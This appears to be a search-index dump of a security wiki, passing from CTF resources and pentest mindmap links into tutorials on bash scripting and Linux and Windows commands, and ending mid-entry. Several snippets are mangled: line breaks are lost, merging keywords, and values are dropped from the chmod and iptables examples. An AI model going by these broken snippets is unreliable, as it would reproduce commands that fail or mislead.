<p>Handling duplicates: To maintain organized and efficient   communication within our discussion board, we   reserve the right to close any duplicated issues or lock duplicated   discussions. Opening multiple channels to ask the same question or report the   same issue across different forums hinders our ability to manage and address   community concerns effectively. This approach is vital for efficient time   management, as duplicated questions can consume the time of multiple team   members simultaneously. Ensuring that each issue or discussion is unique and   progresses with new information helps us to maintain focus and support our   community.</p> </li> <li> <p>We further reserve the right to immediately close discussions or issues that     are reopened without providing new information or simply because users have     not yet received a response to their issue/question, as the issue is marked as     incomplete.</p> </li> </ul>"},{"location":"Other/","title":"Other","text":""},{"location":"Other/#other","title":"Other","text":"<ul> <li> <p> Command Line Interface</p> <p>Master the Command Line and Unleash Your Potential in Linux and Windows.</p> </li> <li> <p> Mindmaps</p> <p>Dive into our concise mindmap section, encompassing visual guides.</p> </li> <li> <p> CTF</p> <p>Get in the world of CTF with excellent Practice resources.</p> </li> <li> <p> Security Comics</p> <p>From XSS Novice to Bug Bounty Pro through Lessons, Laughs, and Code!</p> </li> </ul>"},{"location":"Other/CTF%20Resources/","title":"CTF","text":""},{"location":"Other/CTF%20Resources/#ctf","title":"CTF","text":""},{"location":"Other/CTF%20Resources/#what-is-ctf","title":"What is CTF?","text":"<p>Capture The Flag (CTF) is an information security competition that presents participants with a variety of tasks, ranging from scavenger hunts on Wikipedia to basic programming exercises, or even attempting to breach a server to obtain specific data. In these challenges, participants are typically tasked with locating a specific piece of text, often referred to as the \"flag,\" which may be concealed on a server or within a webpage.</p> <p>For more information, visit: CTF Gitbook, CTF Checklist for Beginners, Beginner's Guide to CTFs, Introduction to Cybersecurity and CTF Contests, CTF 101</p>"},{"location":"Other/CTF%20Resources/#cryptography","title":"Cryptography","text":"<p>Explore cryptography techniques at Interactive Maths.</p>"},{"location":"Other/CTF%20Resources/#tools","title":"Tools","text":"<p>Discover various CTF tools at Awesome Open Source, CTF Tools Repository.</p>"},{"location":"Other/CTF%20Resources/#collaboration-tools","title":"Collaboration Tools","text":"<p>Enhance teamwork with tools like CTFNote.</p>"},{"location":"Other/CTF%20Resources/#references","title":"References","text":"<p>Access useful references and repositories at CTF Resources, CTF GitHub, CTF Time, Lanjelot's CTFs.</p>"},{"location":"Other/CTF%20Resources/#where-to-practice","title":"Where to Practice?","text":"<p>Sharpen your skills at platforms like Hack The Box, TryHackMe, VulnHub, OverTheWire, picoCTF, CTFlearn, Root-Me, CryptoHack, Hacker101, and CyberSecLabs.</p> <p>This compilation aims to provide a comprehensive starting point for individuals interested in delving into the world of CTF competitions and information security challenges. Explore, learn, and enjoy the journey!</p>"},{"location":"Other/Mindmaps/","title":"Mindmap","text":""},{"location":"Other/Mindmaps/#mindmap","title":"Mindmap","text":""},{"location":"Other/Mindmaps/#web-app-pen-test-mindmap","title":"Web-App Pen-test Mindmap","text":"<p>https://www.mindmeister.com/1470766611/web-app-pentest?fullscreen=1</p> <p>https://www.mindmeister.com/1349784699/web-application-security?fullscreen=1</p> <p></p> <p>https://www.mindmeister.com/1736437018?t=SEeZOmvt01</p>"},{"location":"Other/Mindmaps/#android-app-pen-test-mindmap","title":"Android App Pen-test Mindmap","text":"<p>https://t.co/62P7xP8Z7C?amp=1</p>"},{"location":"Other/Mindmaps/#thick-client-pentest-mindmap","title":"Thick Client Pentest Mindmap","text":""},{"location":"Other/Mindmaps/#ways-to-achieve-rce","title":"Ways To Achieve RCE","text":""},{"location":"Other/Technical%20Comics/The%20Story%20of%20XSS/","title":"The Story of XSS","text":""},{"location":"Other/Technical%20Comics/The%20Story%20of%20XSS/#the-story-of-xss","title":"The Story of XSS","text":""},{"location":"Other/basic-linux-commands/bash-scripting/","title":"Bash Scripting","text":""},{"location":"Other/basic-linux-commands/bash-scripting/#bash-scripting","title":"Bash Scripting","text":""},{"location":"Other/basic-linux-commands/bash-scripting/#iterate-over-a-file","title":"Iterate over a file","text":"<p>This script will iterate over a file and echo out every single line:</p> <pre><code>#!/bin/bash\u200bfor line in $(cat file.txt);do    echo $linedone\n</code></pre> <p>Another way of writing is this:</p> <pre><code>#!/bin/bash\u200bwhile read p; do    echo  $pdone \n</code></pre>"},{"location":"Other/basic-linux-commands/bash-scripting/#for-loops","title":"For-loops","text":"<pre><code>#!/bin/bash\u200bfor ((i = 0; i &lt; 10; i++)); do    echo $idone\n</code></pre> <p>Another way to write this is by using the program <code>seq</code>. Seq is pretty much like <code>range()</code> in python. So it can be used like this:</p> <pre><code>#!/bin/bash\u200bfor x in `seq 1 100`; do    echo $xdone\n</code></pre>"},{"location":"Other/basic-linux-commands/bash-scripting/#if-statement","title":"If statement","text":"<p><code>$1</code> here represent the first argument.</p> <pre><code>\u200bif [ \"$1\" == \"\" ]; then    echo \"This happens\"fi\n</code></pre>"},{"location":"Other/basic-linux-commands/bash-scripting/#ifelse","title":"If/Else","text":"<pre><code>#!/bin/bash\u200bif [ \"$1\" == \"\" ]; then    echo \"This happens\"else    echo \"Something else happens\"fi\n</code></pre>"},{"location":"Other/basic-linux-commands/bash-scripting/#command-line-arguments","title":"Command line arguments","text":"<p>Command line arguments are represented like this</p> <p>This is the first command line argument.</p>"},{"location":"Other/basic-linux-commands/bash-scripting/#daemonize-an-execution","title":"Daemonize an execution","text":"<p>If you do a ping-sweep with host the command will take about a second to complete. And if you run that against 255 hosts I will take a long time to complete. To avoid this we can just deamonize every execution to make it faster. We use the <code>&amp;</code> to daemonize it.</p> <pre><code>#!/bin/bash\u200bfor ip in $(cat ips.txt); do    ping -c 1 $ip &amp;done\n</code></pre>"},{"location":"Other/basic-linux-commands/bash-scripting/#use-the-output-of-command","title":"Use the output of command","text":"<p>It has happened to me several times that I want to input the output of a command into a new command, for example:</p> <p>I search for a file, find three, and take the last line, which is a path. Now I want to cat that path:</p> <pre><code>#!/bin/bash\u200blocate 646.c | tail -n 1\n</code></pre> <p>This can be done like this:</p> <pre><code>#!/bin/bash\u200bcat $(locate 646.c | tail -n 1)\n</code></pre>"},{"location":"Other/basic-linux-commands/linux-commands/","title":"Linux Commands","text":""},{"location":"Other/basic-linux-commands/linux-commands/#linux-commands","title":"Linux Commands","text":""},{"location":"Other/basic-linux-commands/linux-commands/#the-shell-bash","title":"The Shell - Bash","text":"<p>The shell, or the terminal is a really useful tool. Bash is the standard shell on most Linux distros.</p>"},{"location":"Other/basic-linux-commands/linux-commands/#navigating","title":"Navigating","text":"<ul> <li><code>pwd</code> - Print working directory</li> <li><code>cd</code> - Change directory</li> <li><code>cd ~</code> - Change directory to your home directory</li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#looking-at-files","title":"Looking at files","text":"<ul> <li><code>ls</code> - List files in directory</li> <li><code>ls -ltr</code> - Sort list by last modified. -time -reverse</li> <li><code>file</code> - Show info about file. What type of file it is. If it is a binary or text file for example.</li> <li><code>cat</code> - Output content of file.</li> <li><code>less</code> - Output file but just little bit at a time. Use this one. Not <code>more</code>.</li> <li><code>/searchterm</code> Use it to search. It is the same command as in vim. <code>n</code> to scroll to next search result. Press <code>q</code> to quit.</li> <li><code>more</code> - Output file but just little bit at a time. <code>less</code> is better.</li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#a-little-bit-of-everything","title":"A little bit of everything","text":"<ul> <li><code>history</code> - Show commands history</li> <li><code>sudo</code> List what rights the sudo user has. Sudo config file is usually /etc/sudoers</li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#working-with-files","title":"Working with files","text":"<ul> <li><code>touch</code> - Create a new file.</li> <li><code>cp</code> - Copy</li> <li><code>mkdir</code> - Make directory.</li> <li><code>mkdir -p new/thisonetoo/and/this/one</code> - Make entire directory structure</li> <li><code>rm</code> - Remove file</li> <li><code>rm -rf ./directory\u200b</code> - Remove recursively and its content. Very dangerous command!</li> </ul> <p>Find</p> <p>Find is slower than locate but a lot more thorough. You can search for files recursively and with regex and a lot of other features.</p> <ul> <li><code>find / -name file 2&gt;/dev/null</code> - This will send all permissions denied outputs to dev/null.</li> </ul> <p>Locate</p> <p>Locate is really fast because it relies on an internal database.</p> <ul> <li><code>sudo updatedb</code> - Update the internal locate database</li> <li><code>locate example.txt</code> - Search for a file named example.txt</li> </ul> <p>Which</p> <p>Outputs the path of the binary that you are looking for. It searches through the directories that are defined in your $PATH variable. - <code>which bash</code> - Prints the path of bash. /bin/bash\u200b</p>"},{"location":"Other/basic-linux-commands/linux-commands/#filters","title":"Filters","text":"<p>There are certain programs that are especially useful to use together with pipes. They can also be used as stand-alone programs but you will often see them together with pipes.</p> <ul> <li><code>sort</code></li> <li><code>uniq</code></li> <li><code>sort -u test.txtsort test.txt | uniqcat filename | sort -u &gt; newFileName</code></li> <li><code>grep</code></li> <li><code>head</code></li> <li><code>tail</code></li> <li><code>tr</code></li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#editing-text","title":"Editing text","text":"<p>sed</p> <p>Can perform basic editing on streams, that is to say, text. - <code>sed -i '1d' example.txt</code> - Remove first line of example.txt</p> <p>cut</p> <p>Cut by column. This is a useful command to cut in text. Let's say that we have the following text, and we want to cut out the ip-address.</p> <p>64 bytes from ip: icmp_req=1 ttl=255 time=4.86 ms</p> <ul> <li><code>echo \"64 bytes from ip: icmp_req=1 ttl=255 time=4.86 ms\" | grep -oP '(\\d+\\.){3}\\d+' | cut -d ' ' -f 4</code> - Cut out IP address.</li> </ul> <p>tr - Translate</p> <ul> <li><code>tr \"[:lower:]\" \"[:upper:]\" &lt; file1 &gt; file2\u200b</code> - Transform all letter into capital letters</li> </ul> <p>Example Remove character - Remove characters</p> <ul> <li> <p><code>cat file.txt | tr -d \".\"</code></p> </li> <li> <p><code>cat file.txt | tr \".\" \"_\"**</code> - Remove all dots and replace them with underscore.</p> </li> </ul> <p>awk</p> <p>awk is an advanced tool for editing text-files. It is its own programming language to it can become quite complex. Awk iterates over the whole file line by line. Below is the basic structure of an awk command</p> <ul> <li> <p><code>awk '/search_pattern/ { action_to_take_on_matches; another_action; }' file_to_parse</code> - The search pattern takes regex. You can exclude the search portion or the action portion.</p> </li> <li> <p><code>awk '/172.16.40.10.81/' error.log</code> - Filtering out specific ip-address</p> </li> <li> <p><code>awk '/172.16.40.10.81/ {print $4}' error.log# Another exampleawk '{print $2,$5;}' error.txt</code> - This prints columns 2 and 5.</p> </li> <li> <p><code>awk -F ':' '{print $1}' test.txt</code> - Use the -F flag to add a custom delimiter</p> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#user-management","title":"User Management","text":"<p>User management involves various commands for creating, modifying, and deleting user accounts, as well as managing user permissions and groups.</p> <ul> <li> <p>useradd: This command is used to add a new user account to the system.</p> <pre><code>useradd username\n</code></pre> </li> <li> <p>passwd: This command is used to set or change the password for a user account.</p> <pre><code>passwd username\n</code></pre> </li> <li> <p>userdel: This command is used to delete a user account from the system.</p> <pre><code>userdel username\n</code></pre> </li> <li> <p>usermod: This command is used to modify user account properties such as username, home directory, shell, etc.</p> <pre><code>usermod -l newusername oldusername  # Change username\nusermod -d /new/home/directory username  # Change home directory\nusermod -s /bin/bash username  # Change default shell\n</code></pre> </li> <li> <p>groupadd: This command is used to add a new group to the system.</p> <pre><code>groupadd groupname\n</code></pre> </li> <li> <p>groupdel: This command is used to delete a group from the system.</p> <pre><code>groupdel groupname\n</code></pre> </li> <li> <p>groups: This command displays the groups to which a user belongs.</p> <pre><code>groups username\n</code></pre> </li> <li> <p>usermod -aG: This command is used to add a user to a supplementary group.</p> <pre><code>usermod -aG groupname username\n</code></pre> </li> <li> <p>chown: This command is used to change the owner of a file or directory.</p> <pre><code>chown username:groupname filename\n</code></pre> </li> <li> <p>chgrp: This command is used to change the group ownership of a file or directory.</p> <pre><code>chgrp groupname filename\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#permissions","title":"Permissions","text":"<p>In Linux, file permissions control access to files and directories. There are three types of permissions: read (r), write (w), and execute (x). These permissions are assigned to three different entities: the file/directory owner, the group associated with the file/directory, and others (everyone else).</p> <ul> <li> <p>chmod: This command is used to change the permissions of a file or directory.</p> <pre><code>chmod permissions filename/directory\n</code></pre> <ul> <li><code>permissions</code> can be specified using symbolic notation (e.g., u+x for adding execute permission for the owner) or octal notation (e.g., - for rwxr-xr-x permissions).</li> </ul> </li> <li> <p>chown: This command is used to change the owner and/or group of a file or directory.</p> <pre><code>chown owner:group filename/directory\n</code></pre> </li> <li> <p>chgrp: This command is used to change the group ownership of a file or directory.</p> <pre><code>chgrp groupname filename/directory\n</code></pre> </li> <li> <p>ls: This command is used to list files and directories, and it also shows their permissions.</p> <pre><code>ls -l\n</code></pre> </li> <li> <p>umask: This command sets the default permissions for newly created files and directories.</p> <pre><code>umask permissions\n</code></pre> </li> <li> <p>setfacl: This command is used to set Access Control Lists (ACLs) for files and directories, allowing more fine-grained control over permissions.</p> <pre><code>setfacl -m u:user:permissions filename/directory\n</code></pre> </li> <li> <p>getfacl: This command is used to view the ACLs of files and directories.</p> <pre><code>getfacl filename/directory\n</code></pre> </li> </ul> <p>\u200bhttps://linuxjourney.com/lesson/file-permissions\u200b</p>"},{"location":"Other/basic-linux-commands/linux-commands/#processes","title":"Processes","text":"<p>In Linux, process commands are used to manage and interact with processes running on the system.</p> <ul> <li> <p>ps: This command is used to display information about active processes.</p> <pre><code>ps\n</code></pre> <ul> <li>To display more detailed information, you can use options like <code>-aux</code>, <code>-ef</code>, or <code>-e</code>. <pre><code>ps aux\n</code></pre></li> </ul> </li> <li> <p>top: This command provides dynamic real-time information about running processes, CPU usage, memory usage, etc.</p> <pre><code>top\n</code></pre> </li> <li> <p>htop: Similar to top but with a more user-friendly interface and additional features.</p> <pre><code>htop\n</code></pre> </li> <li> <p>kill: This command is used to terminate processes by sending signals.</p> <pre><code>kill PID\n</code></pre> <ul> <li>The default signal is SIGTERM (terminate), but you can also send other signals like SIGKILL (force termination) using `-- option. <pre><code>kill -9 PID\n</code></pre></li> </ul> </li> <li> <p>killall: This command is used to kill processes by name rather than by PID.</p> <pre><code>killall process_name\n</code></pre> </li> <li> <p>pgrep: This command is used to search for processes based on name or other attributes and print their PIDs.</p> <pre><code>pgrep process_name\n</code></pre> </li> <li> <p>pkill: This command is used to send signals to processes based on their names or other attributes.</p> <pre><code>pkill process_name\n</code></pre> </li> <li> <p>nice: This command is used to launch a process with a specified priority (niceness).</p> <pre><code>nice -n value command\n</code></pre> </li> <li> <p>renice: This command is used to change the priority (niceness) of an already running process.</p> <pre><code>renice priority PID\n</code></pre> </li> <li> <p>jobs: This command is used to display currently running jobs in the shell.</p> <pre><code>jobs\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#package-management","title":"Package management","text":"<p>Package management is typically done using the Advanced Packaging Tool (APT) and its various frontends. (in Ubuntu, other linux distributions uses other package managers)</p> <ul> <li> <p>apt-get: This is a command-line tool used to handle package management tasks, such as installing, updating, upgrading, and removing packages.</p> <ul> <li> <p>Install a package: </p><pre><code>sudo apt-get install package_name\n</code></pre> </li> <li> <p>Remove a package: </p><pre><code>sudo apt-get remove package_name\n</code></pre> </li> <li> <p>Update the package list (repository information): </p><pre><code>sudo apt-get update\n</code></pre> </li> <li> <p>Upgrade installed packages to their latest versions: </p><pre><code>sudo apt-get upgrade\n</code></pre> </li> </ul> </li> <li> <p>apt: A more user-friendly frontend to apt-get. It provides colorful output and progress bars.</p> <ul> <li>Install a package: <pre><code>sudo apt install package_name\n</code></pre></li> </ul> </li> <li> <p>apt-cache: This command is used to search and query information about packages available in APT's package cache.</p> <ul> <li> <p>Search for a package: </p><pre><code>apt-cache search search_term\n</code></pre> </li> <li> <p>Show information about a specific package: </p><pre><code>apt-cache show package_name\n</code></pre> </li> </ul> </li> <li> <p>dpkg: This is a low-level package management tool. It can be used to install, remove, and query information about individual packages.</p> <ul> <li> <p>Install a package (with its full path): </p><pre><code>sudo dpkg -i /path/to/package.deb\n</code></pre> </li> <li> <p>Remove a package (keeping its configuration files): </p><pre><code>sudo dpkg -r package_name\n</code></pre> </li> <li> <p>Remove a package (including its configuration files): </p><pre><code>sudo dpkg -P package_name\n</code></pre> </li> </ul> </li> <li> <p>aptitude: Another frontend for APT. It provides a text-based interface for package management tasks and dependency resolution.</p> <ul> <li>Install a package: <pre><code>sudo aptitude install package_name\n</code></pre></li> </ul> </li> <li> <p>snap: Ubuntu also supports snap packages, which are self-contained applications bundled with their dependencies.</p> <ul> <li> <p>Install a snap package: </p><pre><code>sudo snap install package_name\n</code></pre> </li> <li> <p>Remove a snap package: </p><pre><code>sudo snap remove package_name\n</code></pre> </li> </ul> </li> <li> <p>Adding a Path: This is a non-persistent way to add binaries to your path. Might be useful if you have entered a system that has limited binaries in the path. </p><pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#cronjobs","title":"Cronjobs","text":"<p>Cronjobs are scheduled tasks in Unix-like operating systems, including Linux, that run at predefined times or intervals. They are managed using the cron daemon.</p> <ul> <li> <p>crontab: This command is used to create, edit, and list cronjobs for a user.</p> <pre><code>crontab -e   # Edit the cronjobs for the current user\ncrontab -l   # List the cronjobs for the current user\ncrontab -r   # Remove all cronjobs for the current user\n</code></pre> </li> <li> <p>cron.allow and cron.deny: These files are used to control access to the cron daemon. If <code>cron.allow</code> exists, only users listed in it are allowed to use cron. If <code>cron.allow</code> does not exist but <code>cron.deny</code> does, users listed in <code>cron.deny</code> are not allowed to use cron. If neither file exists, only the superuser can use cron.</p> </li> <li> <p>/etc/cron.d/: This directory contains system-specific cronjobs. Instead of using the crontab command, system administrators can place cronjob files directly in this directory. The format of these files is the same as the user crontab files.</p> </li> <li> <p>/etc/cron.{hourly,daily,weekly,monthly}/: These directories contain system-wide scripts that are executed hourly, daily, weekly, or monthly. Scripts placed in these directories will be run automatically at the specified intervals.</p> </li> <li> <p>systemctl: On modern Linux distributions using systemd, you can control the cron service using systemctl.</p> <pre><code>systemctl start cron.service    # Start the cron service\nsystemctl stop cron.service     # Stop the cron service\nsystemctl restart cron.service  # Restart the cron service\nsystemctl status cron.service   # Check the status of the cron service\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#devices","title":"Devices","text":"<p>In Linux, devices commands are used to manage and interact with hardware devices connected to the system. These commands help in viewing device information, configuring devices, and diagnosing issues.</p> <ul> <li> <p>lsblk: This command lists information about block devices (e.g., hard drives, solid-state drives) connected to the system.</p> <pre><code>lsblk\n</code></pre> </li> <li> <p>lspci: This command lists all PCI buses and devices connected to them.</p> <pre><code>lspci\n</code></pre> </li> <li> <p>lsusb: This command lists USB buses and devices connected to them.</p> <pre><code>lsusb\n</code></pre> </li> <li> <p>lshw: This command provides detailed information about hardware configuration, including devices and their drivers.</p> <pre><code>lshw\n</code></pre> </li> <li> <p>dmesg: This command displays the kernel ring buffer, which contains information about device detection and driver initialization messages.</p> <pre><code>dmesg\n</code></pre> </li> <li> <p>hwinfo: This command provides detailed hardware information, including devices and their configuration.</p> <pre><code>hwinfo\n</code></pre> </li> <li> <p>udevadm: This command is used to manage device nodes in the udev (device manager) system.</p> <pre><code>udevadm info /dev/sda\n</code></pre> </li> <li> <p>hdparm: This command is used to get/set ATA/SATA device parameters like reading/writing speed, power management, etc.</p> <pre><code>hdparm -I /dev/sda  # Get detailed information about a SATA drive\n</code></pre> </li> <li> <p>fdisk and parted: These commands are used for disk partitioning and management.</p> <pre><code>fdisk -l  # List partitions on all disks\nparted /dev/sda print  # Print partition table for a specific disk\n</code></pre> </li> <li> <p>lsdev: This command lists all available devices on the system.</p> <pre><code>lsdev\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#mount","title":"Mount","text":"<p>In Linux, the <code>mount</code> command is used to mount file systems onto directories within the Linux filesystem.</p> <ul> <li> <p>Mounting a File System:</p> <pre><code>mount /dev/sdXY /mnt/mydisk\n</code></pre> <ul> <li>This command mounts the file system located on device <code>/dev/sdXY</code> to the directory <code>/mnt/mydisk</code>. Replace <code>/dev/sdXY</code> with the appropriate device identifier (e.g., `/dev/sda- for the first partition on the first SCSI/SATA/USB drive).</li> </ul> </li> <li> <p>Mounting All File Systems Listed in <code>/etc/fstab</code>:</p> <pre><code>mount -a\n</code></pre> <ul> <li>This command mounts all file systems listed in the <code>/etc/fstab</code> file that are not already mounted.</li> </ul> </li> <li> <p>Unmounting a File System:</p> <pre><code>umount /mnt/mydisk\n</code></pre> <ul> <li>This command unmounts the file system mounted on <code>/mnt/mydisk</code>. Replace <code>/mnt/mydisk</code> with the appropriate mount point.</li> </ul> </li> <li> <p>Mounting a Network File System (NFS):</p> <pre><code>mount -t nfs server:/remote/directory /mnt/mountpoint\n</code></pre> <ul> <li>This command mounts a remote NFS share located at <code>server:/remote/directory</code> to the local directory <code>/mnt/mountpoint</code>.</li> </ul> </li> <li> <p>Mounting a CD-ROM or DVD:</p> <pre><code>mount /dev/cdrom /mnt/cdrom\n</code></pre> <ul> <li>This command mounts the CD-ROM or DVD drive to the directory <code>/mnt/cdrom</code>.</li> </ul> </li> <li> <p>Viewing Mounted File Systems:</p> <pre><code>mount\n</code></pre> <ul> <li>This command displays a list of all currently mounted file systems.</li> </ul> </li> <li> <p>Bind Mounting:</p> <pre><code>mount --bind /source/directory /destination/directory\n</code></pre> <ul> <li>This command mounts a directory at another location, making the content of both directories accessible at both mount points.</li> </ul> </li> <li> <p>Remounting a File System with Different Options:</p> <pre><code>mount -o remount,rw /mnt/mydisk\n</code></pre> <ul> <li>This command remounts the file system mounted on <code>/mnt/mydisk</code>, changing its options. In this example, it remounts it with read-write permissions.</li> </ul> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#controlling-services","title":"Controlling services","text":"<p>In Linux, services are background processes that run continuously to provide specific functionalities. Controlling services involves starting, stopping, restarting, enabling at boot time, and disabling services as needed.</p> <ul> <li> <p>systemctl: This command is used to control systemd services in modern Linux distributions such as Ubuntu, CentOS, and Fedora.</p> <ul> <li> <p>Start a service: </p><pre><code>sudo systemctl start service_name\n</code></pre> </li> <li> <p>Stop a service: </p><pre><code>sudo systemctl stop service_name\n</code></pre> </li> <li> <p>Restart a service: </p><pre><code>sudo systemctl restart service_name\n</code></pre> </li> <li> <p>Enable a service to start automatically at boot time: </p><pre><code>sudo systemctl enable service_name\n</code></pre> </li> <li> <p>Disable a service from starting automatically at boot time: </p><pre><code>sudo systemctl disable service_name\n</code></pre> </li> <li> <p>Check the status of a service: </p><pre><code>sudo systemctl status service_name\n</code></pre> </li> </ul> </li> <li> <p>service: This command is used to control SysVinit services, commonly found in older Linux distributions.</p> <ul> <li> <p>Start a service: </p><pre><code>sudo service service_name start\n</code></pre> </li> <li> <p>Stop a service: </p><pre><code>sudo service service_name stop\n</code></pre> </li> <li> <p>Restart a service: </p><pre><code>sudo service service_name restart\n</code></pre> </li> <li> <p>Check the status of a service: </p><pre><code>sudo service service_name status\n</code></pre> </li> </ul> </li> <li> <p>chkconfig: This command is used to enable or disable services to start at boot time on SysVinit-based systems.</p> <ul> <li> <p>Enable a service at boot time: </p><pre><code>sudo chkconfig service_name on\n</code></pre> </li> <li> <p>Disable a service from starting at boot time: </p><pre><code>sudo chkconfig service_name off\n</code></pre> </li> </ul> </li> <li> <p>update-rc.d: This command is used to manage System V (SysV) init scripts on Debian-based systems.</p> <ul> <li> <p>Enable a service at boot time: </p><pre><code>sudo update-rc.d service_name defaults\n</code></pre> </li> <li> <p>Disable a service from starting at boot time: </p><pre><code>sudo update-rc.d -f service_name remove\n</code></pre> </li> </ul> </li> </ul> <p>These commands allow administrators to control the operation of services on Linux systems effectively. They are crucial for managing server processes, ensuring that essential services start automatically after system reboots, and troubleshooting service-related issues. The specific commands to use may vary depending on the Linux distribution and the init system being used (SysVinit or systemd).</p>"},{"location":"Other/basic-linux-commands/linux-commands/#network-basics","title":"Network basics","text":"<p>In Linux, there are several commands available to manage and troubleshoot network-related tasks.</p> <ul> <li> <p>ifconfig: This command displays the configuration of network interfaces, including IP addresses, MAC addresses, and network-related statistics.</p> <pre><code>ifconfig\n</code></pre> <ul> <li>Note: <code>ifconfig</code> has been deprecated on many modern Linux distributions in favor of <code>ip</code> command.</li> </ul> </li> <li> <p>ip: This command is a more modern replacement for <code>ifconfig</code> and provides extensive functionality for configuring network interfaces, routing tables, and more.</p> <ul> <li> <p>Show information about network interfaces: </p><pre><code>ip addr show\n</code></pre> </li> <li> <p>Show routing table: </p><pre><code>ip route show\n</code></pre> </li> </ul> </li> <li> <p>ping: This command is used to send ICMP echo requests to a specified host to check network connectivity.</p> <pre><code>ping hostname_or_IP\n</code></pre> </li> <li> <p>traceroute: This command is used to trace the route that packets take from your computer to a specified destination host.</p> <pre><code>traceroute hostname_or_IP\n</code></pre> </li> <li> <p>netstat: This command displays network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.</p> <ul> <li>Show network connections: <pre><code>netstat -tuln\n</code></pre></li> </ul> </li> <li> <p>ss: This command is a modern replacement for <code>netstat</code> and provides similar functionality.</p> <ul> <li>Show socket statistics: <pre><code>ss -tuln\n</code></pre></li> </ul> </li> <li> <p>dig: This command is used to perform DNS (Domain Name System) queries such as looking up IP addresses associated with domain names.</p> <pre><code>dig domain_name\n</code></pre> </li> <li> <p>nslookup: This command is used to query DNS servers to obtain domain name or IP address mapping.</p> <pre><code>nslookup domain_name\n</code></pre> </li> <li> <p>hostname: This command displays the hostname of the system.</p> <pre><code>hostname\n</code></pre> </li> <li> <p>ifup/ifdown: These commands are used to bring network interfaces up or down manually.</p> <pre><code>sudo ifup interface_name\nsudo ifdown interface_name\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#firewall","title":"Firewall","text":"<p>In Linux, a firewall is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules. The firewall can be implemented using various tools such as iptables, nftables, and firewalld. These tools allow administrators to define rules that specify which network packets are allowed or denied based on criteria such as source and destination IP addresses, ports, and protocols.</p> <p>Here are some key concepts related to firewalls in Linux:</p> <ul> <li> <p>Packet Filtering: A firewall examines each network packet passing through it and decides whether to allow or block it based on predefined rules. Packet filtering is the fundamental functionality of a firewall.</p> </li> <li> <p>Chains: In Linux firewall configurations, rules are organized into chains. Each chain is a list of rules that are applied sequentially to incoming or outgoing packets. Commonly used chains in Linux firewalls include:</p> </li> <li> <p>INPUT chain: Used for packets destined for the local system.</p> </li> <li>OUTPUT chain: Used for packets originating from the local system.</li> <li> <p>FORWARD chain: Used for packets that are being routed through the system.</p> </li> <li> <p>Default Policies: Each chain has a default policy that specifies what action should be taken if a packet does not match any of the rules in the chain. Common default policies are ACCEPT, DROP, and REJECT.</p> </li> <li> <p>Rules: Rules are the individual instructions that determine whether a packet is allowed or denied. Each rule consists of criteria (such as source and destination addresses, ports, and protocols) and an action (such as ACCEPT, DROP, or REJECT). Rules are evaluated in order, and the action of the first matching rule is applied.</p> </li> <li> <p>Stateful Inspection: Some firewall configurations support stateful inspection, which tracks the state of active network connections. This allows the firewall to make more informed decisions based on the state of the connection, such as allowing return traffic for established connections.</p> </li> <li> <p>Logging: Firewalls can be configured to log information about packets that are blocked or allowed. Logging helps administrators monitor network traffic and troubleshoot firewall issues.</p> </li> <li> <p>Network Address Translation (NAT): In addition to packet filtering, firewalls can also perform Network Address Translation (NAT) to modify the source or destination IP addresses of packets as they pass through the firewall. NAT is often used to hide internal IP addresses or to map multiple internal IP addresses to a single external IP address.</p> </li> </ul>"},{"location":"Other/basic-linux-commands/linux-commands/#iptables","title":"iptables","text":"<p>In Linux, <code>iptables</code> is a powerful firewall utility that allows administrators to configure rules for packet filtering and network address translation (NAT).</p> <ul> <li>Listing Current Rules:</li> <li> <p>List all current rules:      </p><pre><code>sudo iptables -L\n</code></pre> </li> <li> <p>Creating Rules:</p> </li> <li>Add a rule to allow traffic on a specific port (e.g., TCP port 80):      <pre><code>sudo iptables -A INPUT -p tcp --dport - -j ACCEPT\n</code></pre></li> <li>Add a rule to allow traffic from a specific IP address:      <pre><code>sudo iptables -A INPUT -s &lt;IP_address&gt; -j ACCEPT\n</code></pre></li> <li> <p>Add a rule to block traffic from a specific IP address:      </p><pre><code>sudo iptables -A INPUT -s &lt;IP_address&gt; -j DROP\n</code></pre> </li> <li> <p>Deleting Rules:</p> </li> <li> <p>Delete a specific rule (use <code>-D</code> followed by the rule number as listed in <code>iptables -L</code>):      </p><pre><code>sudo iptables -D INPUT &lt;rule_number&gt;\n</code></pre> </li> <li> <p>Flushing Rules:</p> </li> <li> <p>Flush all rules (delete all rules from the specified chain):      </p><pre><code>sudo iptables -F\n</code></pre> </li> <li> <p>Setting Policies:</p> </li> <li> <p>Set the default policy for a chain (e.g., INPUT, OUTPUT, FORWARD) to DROP:      </p><pre><code>sudo iptables -P INPUT DROP\n</code></pre> </li> <li> <p>Saving and Restoring Rules:</p> </li> <li>Save current rules to a file:      <pre><code>sudo iptables-save &gt; /path/to/save/iptables-rules\n</code></pre></li> <li> <p>Restore rules from a file:      </p><pre><code>sudo iptables-restore &lt; /path/to/saved/iptables-rules\n</code></pre> </li> <li> <p>Miscellaneous Commands:</p> </li> <li>Check detailed information about packet counters and byte counts:      <pre><code>sudo iptables -L -v\n</code></pre></li> </ul>"},{"location":"Other/basic-linux-commands/windows/","title":"Windows Commands","text":""},{"location":"Other/basic-linux-commands/windows/#windows-commands","title":"Windows Commands","text":"<ul> <li> <p>Show Hidden Files </p><pre><code>dir /A\n</code></pre> </li> <li> <p>Print File Content </p><pre><code>type file.txt\n</code></pre> </li> <li> <p>Grep Equivalent </p><pre><code>findstr file.txt\n</code></pre> </li> <li> <p>Show Network Information </p><pre><code>netstat -an\n</code></pre> </li> <li> <p>Show Network Adapter Info 